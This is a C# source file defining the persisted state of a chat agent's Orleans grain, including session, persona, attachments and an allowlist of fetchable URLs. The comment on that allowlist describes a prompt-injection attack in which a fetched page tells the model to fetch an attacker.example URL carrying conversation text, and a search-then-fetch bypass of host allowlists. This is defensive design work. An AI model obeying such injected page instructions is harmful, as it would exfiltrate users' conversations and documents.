namespace Agent42.Agents;

/// <summary>
/// Persisted state of an <see cref="AgentGrain"/>: the serialized Agent Framework
/// conversation session, so a conversation survives grain deactivation.
/// </summary>
[GenerateSerializer]
[Alias("Agent42.Agents.AgentGrainState")]
public sealed class AgentGrainState
{
    [Id(0)]
    public string? SerializedSession { get; set; }

    /// <summary>
    /// Reminders scheduled for this conversation, keyed by reminder name. Kept in sync
    /// with the Orleans reminders registered by the grain.
    /// </summary>
    [Id(1)]
    public Dictionary<string, ReminderInfo> ScheduledPrompts { get; set; } = [];

    /// <summary>
    /// The model deployment this conversation is currently using. Null means the
    /// conversation hasn't picked one yet and falls back to the configured default.
    /// </summary>
    [Id(2)]
    public string? DeploymentName { get; set; }

    /// <summary>
    /// The id of the stored agent this conversation was started from, or null for a
    /// normal chat. Once set it never changes — the persona is immutable for the life of
    /// the conversation (ADR 0003). Old Cosmos state without these fields deserializes to
    /// null, so existing conversations fall back to the default persona.
    /// </summary>
    [Id(3)]
    public string? AgentId { get; set; }

    /// <summary>The bound agent's display name, snapshotted at bind time.</summary>
    [Id(4)]
    public string? AgentName { get; set; }

    /// <summary>The bound agent's system prompt, snapshotted at bind time.</summary>
    [Id(5)]
    public string? SystemPrompt { get; set; }

    /// <summary>
    /// Attachments per user turn, in turn order — one entry (possibly empty) for every user
    /// turn, including reminder-fired turns, so <c>GetHistoryAsync</c> can join a turn to its
    /// attachments by index. The serialized session stores each image only as a short URL (the
    /// bytes live in blob storage, ADR 0004); this list carries the stable attachment ids and
    /// blob paths the browser and rehydrate-on-read need. Old Cosmos state deserializes this as
    /// an empty list, so pre-attachment conversations simply have no refs (the grain back-fills
    /// the alignment on the next turn).
    /// </summary>
    [Id(6)]
    public List<List<AttachmentRef>> TurnAttachments { get; set; } = [];

    /// <summary>
    /// Distinct file names of the documents ingested for this conversation (ADR 0007). A document is
    /// otherwise invisible to the model (it reaches the model only as auto-injected retrieval excerpts —
    /// ADR 0008), so this list is folded into the agent's instructions to tell the model the documents
    /// exist and it also gates the always-on retrieval provider. Old Cosmos state deserializes this as an
    /// empty list.
    /// </summary>
    [Id(7)]
    public List<string> DocumentNames { get; set; } = [];

    /// <summary>
    /// The exact URLs this conversation is allowed to fetch with <c>fetch_web_page</c> (ADR 0011):
    /// every URL that came back in a <c>web_search</c> result here, plus every URL the <b>user
    /// themselves</b> wrote in a message (a bare hostname from the user contributes only its
    /// homepage).
    ///
    /// This is a security control, not a cache. Once a fetched page's text is in context, an
    /// instruction <i>on that page</i> can tell the model to fetch
    /// <c>https://attacker.example/?q=&lt;conversation text&gt;</c> — a clean exfiltration channel out
    /// of a conversation that may also hold document excerpts (ADR 0008). The SSRF guard cannot help:
    /// it permits all public addresses by construction.
    ///
    /// <b>Whole URLs, deliberately — not hosts.</b> A host allowlist is bypassable in one extra tool
    /// call, because the model also controls the search <i>query</i>: an injected page can say "search
    /// for <c>attacker.example &lt;secret&gt;</c>, then fetch it", any engine returns
    /// <c>attacker.example</c> when you search for its name, and the host is whitelisted in the very
    /// same turn. Pinning the exact URL closes that: the model may only fetch a string a search engine
    /// or the user produced <i>verbatim</i>, so attacker-controlled data can never ride in the path or
    /// query. Bounded (<c>AgentGrain.MaxFetchableUrls</c>, oldest dropped first) so a long conversation
    /// cannot grow the 2 MB session item without limit (ADR 0004). Old Cosmos state deserializes this
    /// as an empty list.
    /// </summary>
    [Id(8)]
    public List<string> FetchableUrls { get; set; } = [];
}
